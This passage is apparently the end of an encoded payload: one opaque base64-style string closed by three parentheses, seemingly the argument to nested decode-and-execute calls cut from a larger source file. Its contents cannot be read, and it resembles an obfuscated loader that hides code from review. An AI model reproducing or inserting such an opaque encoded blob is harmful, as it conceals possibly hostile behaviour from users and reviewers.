NQeCh2b5PPgcEjBTMoEW5tOCM+AdhNZgsyWieV6dmNCcG9S1Jx61pYl2TB5+s/ksBOeSAyS9Lw15WvaMbnh8hrBGqFbSAqeTj/z909zOKpsclN5laDES/xKkXhFCYKdF/AVzaNBxq82lmgY9iIQ7wXFCJ1O5C7ohlEj52KFbWfXgmXQYLKbOi2QDKlEcaJIlHUoJ2e6BMqxn0OqxZXh0k3cBDl0RH95FvuNmc2jXC2ssvKCT29AiMXOZEB5pTArh6BJStEW0ubFsHra8pWn4TdDtIRe4IT1Y2RlFEcfHaGmIUUSIHp6glT9vBSe3JOKF3d7Z2eDion0xuOicDgZPuoPu4OxFe9rptxEaY306Ph2gSfcMnfUusN5B3e5pb9w5gDNYkD+EqOKBpy9GX7DrGQ5Bd0DP/qNhSPZmNEhpOhNk4iG2R79cHbA3pcWi14ZiBNfQcLwDMoph0oR45BFSCeLRhLyPgb1h58AzZsPedDAYTC8uCHWd6UQ/Q6g96feng/PpoNvF09NYFGlESQi6EqZxq62CQ4q4+Cg8IlljxLONLjWCJy+FvvYFsy0N7LUyN+Qklwq9JY9zYirugOf5+RfPubgDm0Doer1OiEBEbLjCdmR5M3FdBdFYlQnvWXRudUPKxSkZojIrU9SxXhrVOFmqU+fYOvRcGMXQA009jIvyGzdAiA4PhWMBKYeHMcf5B0jbpcqT9x/GVfOlCV9D/VFdQydslng28Z9msdz5cXUpAlalUrFYONh/WGwN12ylC6v7ZTlWov0KpHjuEq5l9hIucXYnqkMTjwE2dFUUHgAGXH63maGny0yZK6lXO/3qp1u6hTGhdFi3MwKPUBt+G10CBhzWszksS/tkJngKAlGBygkYlKlgy7hyQrskJUTqg27Lx2um1sIdaa/ev6YdMXuZ8FaXxcmJle+fIzrBxZbzBafkPa+9tr+xVv4eNexK4XYnn9K19vHzyXdYYHOF3E28mK1seUkOkcEymGTezQd/vmvWy9W+IPE5EY0vxGGoazXiO8ITtCnO8qvwFIthqi+um6XWvaGFb8AI2vDdFY5bfIa+NqmUHQUlFGvpZtJ1cLYDUcrGFJHiyZ7EoSWFchbazZSrvAQ9I8eQwKJYKpZSF9noEo+EnRn7I3AgDD14sbBbC554gZ2/wfgb6wHJ8qDIU10ZgvGVXMTjYn/l2lAqNJlCUmPmYxuNif8Nx6qGBFOMqZeht0KnufEFuQY85g3/87j9+PI/jw1v5M0h0QHWH18SA+LoMfPPDXLh8cX47Lxz0Zkcn/en+nEfjU+Px22EjjsX497FtN1Hp+PJ46PH9LDX4IknHvk9MQ1s+yNr5SM/wjVu9zqnun563JuSj/4Yj48R1vvH43H3YjLQJ6f9cfvxf/97EK6Ogq1IB7ozIQ8PO/2zs3a/173o9k7POue9A8JR93YEpubwjXcVvsAV9n8KazygoZYRYRlamb43hJ4RXrNXphleSIQwQprp2mKCe+LoeEguT8cjtDRGpBFHwc4BM7PesDjBa2J3NDGJLyAvSacMgzY8YjZl0FZzovqxC5LznwYZI31C1TGslWtcag1i75rGhCI4uTler9fHELc5JlKFbaBYh/Hj+Yow0DW+BvWQp97DFY2Tzv8WFHB66U+zIZNmulWMoDiiwjWEjyNG+zD8yw8NTL6ZHmskZY/qLnAzWLn64sjxQob8DCnJUYe+9naWDqY5EOhaOQty2KBgxabs6FjpQbMetgisSbNHTrrctuPUOeHqiHbP0YiOGaORRWoZjcKxw0LeatE8/P/fzT8R")))